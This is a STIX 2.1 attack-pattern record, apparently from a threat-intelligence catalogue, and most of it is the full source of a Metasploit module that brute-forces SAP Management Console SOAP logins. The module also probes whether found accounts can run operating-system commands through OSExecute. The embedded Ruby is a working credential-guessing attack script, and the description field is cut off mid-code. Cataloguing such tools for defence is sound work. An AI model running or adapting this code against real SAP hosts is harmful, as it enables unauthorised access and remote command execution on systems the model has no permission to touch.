{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dbda37e1-5266-433a-9d6d-79045aca72d2",
    "created": "2024-08-14T16:27:01.281061Z",
    "modified": "2024-08-14T16:27:01.281065Z",
    "name": "SAP Management Console Brute Force",
    "description": " This module simply attempts to brute force the username and password for the SAP Management Console SOAP Interface. If the SAP_SID value is set it will replace instances of <SAPSID> in any user/pass from any wordlist.  'References'     => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_mgmt_con_brute_login.rb",
            "external_id": "sap_mgmt_con_brute_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'           => 'SAP Management Console Brute Force',\n      'Description'    => %q{\n        This module simply attempts to brute force the username and\n        password for the SAP Management Console SOAP Interface. If\n        the SAP_SID value is set it will replace instances of <SAPSID>\n        in any user/pass from any wordlist.\n        },\n      'References'     =>\n        [\n          # General\n          [ 'URL', 'https://blog.c22.cc' ]\n        ],\n      'Author'         => [ 'Chris John Riley' ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(50013),\n        OptString.new('SAP_SID', [false, 'Input SAP SID to attempt brute-forcing standard SAP accounts ', nil]),\n        OptString.new('TARGETURI', [false, 'Path to the SAP Management Console ', '/']),\n        OptPath.new('USER_FILE', [ false, \"File containing users, one per line\",\n                                   File.join(Msf::Config.data_directory, \"wordlists\", \"sap_common.txt\") ])\n      ])\n    register_autofilter_ports([ 50013 ])\n\n    deregister_options('HttpUsername', 'HttpPassword')\n  end\n\n  def run_host(rhost)\n    uri = normalize_uri(target_uri.path)\n    res = send_request_cgi({\n      'uri'     => uri,\n      'method'  => 'GET'\n    })\n\n    if not res\n      print_error(\"#{peer} [SAP] Unable to connect\")\n      return\n    end\n\n    print_status(\"SAPSID set to '#{datastore['SAP_SID']}'\") if datastore['SAP_SID']\n\n    each_user_pass do |user, pass|\n      enum_user(user,pass,uri)\n    end\n\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def enum_user(user, pass, uri)\n\n    # Replace placeholder with SAP SID, if present\n    if datastore['SAP_SID']\n      user = user.gsub(\"<SAPSID>\", datastore[\"SAP_SID\"].downcase)\n      pass = pass.gsub(\"<SAPSID>\", datastore[\"SAP_SID\"])\n    end\n\n    print_status(\"Trying username:'#{user}' password:'#{pass}'\")\n    success = false\n\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n    ns1 = 'ns1:OSExecute'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi + '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<' + ns1 + ' xmlns:ns1=\"urn:SAPControl\"><command>hostname</command><async>0</async></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    user_pass = Rex::Text.encode_base64(user + \":\" + pass)\n\n    begin\n      res = send_request_raw({\n        'uri'      => uri,\n        'method'   => 'POST',\n        'data'     => data,\n        'headers'  =>\n          {\n            'Content-Length' => data.length,\n            'SOAPAction'     => '\"\"',\n            'Content-Type'   => 'text/xml; charset=UTF-8',\n            'Authorization'  => 'Basic ' + user_pass\n          }\n      })\n\n      return unless res\n\n      if (res.code != 500 and res.code != 200)\n        return\n      else\n        body = res.body\n        if body.match(/Invalid Credentials/i)\n          success = false\n        else\n          success = true\n          if body.match(/Permission denied/i)\n            permission = false\n          end\n\n          if body.match(/OSExecuteResponse/i)\n            permission = true\n          end\n        end\n      end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} [SAP] Unable to connect\")\n      return\n    end\n\n    if success\n      print_good(\"#{peer} [SAP] Successful login '#{user}' password: '#{pass}'\")\n\n      if permission\n        vprint_good(\"#{peer} [SAP] Login '#{user}' authorized to perform OSExecute calls\")\n      else\n        vprint_error(\"#{peer} [SAP] Login '#{user}' NOT authorized to perform OSExecute calls\")\n      end\n\n      report_cred(\n        ip: rhost,\n        port: rport,\n        user: user,\n        password: pass,\n        service_name: 'sap-managementconsole',\n        proof: res.body\n      )\n    else\n      vprint_error(\"#{peer} [SAP] failed to login as '#{user}':'#{pass}'\")\n    end\n  end\nend\n\n",
    "x_mitre_contributors": [
        "[ Chris John Riley ]",
        ""
    ]
}